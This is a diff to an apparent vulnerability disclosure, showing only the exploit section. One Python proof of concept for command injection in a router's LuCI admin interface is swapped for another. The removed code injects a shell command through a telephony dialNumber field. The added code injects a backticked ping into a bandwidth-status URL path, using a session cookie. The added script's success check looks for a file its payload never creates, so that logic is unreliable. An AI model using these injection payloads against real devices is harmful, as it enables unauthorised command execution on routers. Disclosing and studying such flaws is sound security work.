@@ -12,24 +12,25 @@ The potentially attacking vector is as follows:
 ```py
 import requests
 
-TARGET_URL = "http://192.168.1.1/cgi-bin/luci/admin/telephony/trigger_call_dial_constant"
-COOKIES = {"sysauth": "session_id"}
+target_ip = "192.168.1.250"
+cookies = {'sysauth': 'sessionID'}
 
-cmd = '10086"; touch /tmp/DIAL_VULN_PROVED; #'
+payload = "`ping%20192.168.1.2`"
 
-data = {
-    "Dial": "1",
-    "dialNumber": cmd
-}
+url = f"http://{target_ip}/cgi-bin/luci/;stok=xxxxxx/admin/status/realtime/bandwidth_status/{payload}"
 
 try:
-    response = requests.post(TARGET_URL, data=data, cookies=COOKIES, timeout=10)
-    if response.status_code == 200:
-        print("[+] Attack successfully")
+    response = requests.get(url, cookies=cookies)
+    print(f"Send: {response.status_code}")
+    
+    verify_url = f"http://{target_ip}/vuln_test.txt"
+    v_res = requests.get(verify_url)
+    if v_res.status_code == 200:
+        print("[-] attack successfully!")
     else:
-        print(f"[-] Attack failed")
+        print("[!] attack failed")
 except Exception as e:
-    print(f"[-] Error: {e}")
+    print(f"failed: {e}")
 ```
 
 The attacking result is as follows:
